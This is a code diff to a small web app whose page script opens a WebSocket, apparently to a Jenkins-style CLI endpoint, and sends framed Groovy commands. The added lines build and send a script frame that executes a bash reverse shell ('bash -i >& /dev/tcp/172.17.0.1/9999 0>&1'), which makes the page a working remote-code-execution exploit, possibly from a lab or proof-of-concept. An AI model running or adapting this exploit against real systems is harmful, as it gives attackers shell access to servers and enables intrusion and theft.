@@ -24,12 +24,12 @@ def index():
             ws.onopen = function() {
                 console.log("Connected");
 
-                const command = new TextEncoder().encode("groovy = < payload.groovy"); // Convert string to byte array (Uint8Array)
+                const command = new TextEncoder().encode("groovy"); // Convert string to byte array (Uint8Array)
                 console.log(command);
 
                 // Define the start and end frames
-                const start = new Uint8Array([0x00, 0x00, 0x19]);   // last byte needs to match length of command
-                const end = new Uint8Array([0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53]);
+                const start = new Uint8Array([0x00, 0x00, 0x06]);   // last byte needs to match length of command
+                const end = new Uint8Array([0x00, 0x00, 0x01, 0x3d, 0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53]);
 
                 // Combine the start, command, and end frames into one frame
                 const commandFrame = new Uint8Array(start.length + command.length + end.length);
@@ -44,7 +44,20 @@ def index():
                 // Send the start signal (0x03) as a separate binary frame
                 ws.send(new Uint8Array([0x03]));
                 console.log("Start signal sent");
-
+                
+                const start_script = new Uint8Array([0x05]); 
+                const script = new TextEncoder().encode("['bash', '-c', 'bash -i >& /dev/tcp/172.17.0.1/9999 0>&1'].execute()"); // Convert string to byte array (Uint8Array)
+                console.log(script);
+                const end_script = new Uint8Array([0x06]); 
+                
+                const scriptFrame = new Uint8Array(start_script.length + script.length + end_script.length);
+                scriptFrame.set(start_script);
+                scriptFrame.set(script, start_script.length);
+                scriptFrame.set(end_script, start_script.length + script.length);
+                
+                ws.send(scriptFrame);
+                console.log("Script sent");
+                
                 // Start listening for responses
                 let i = 0;
                 ws.onmessage = function(event) {
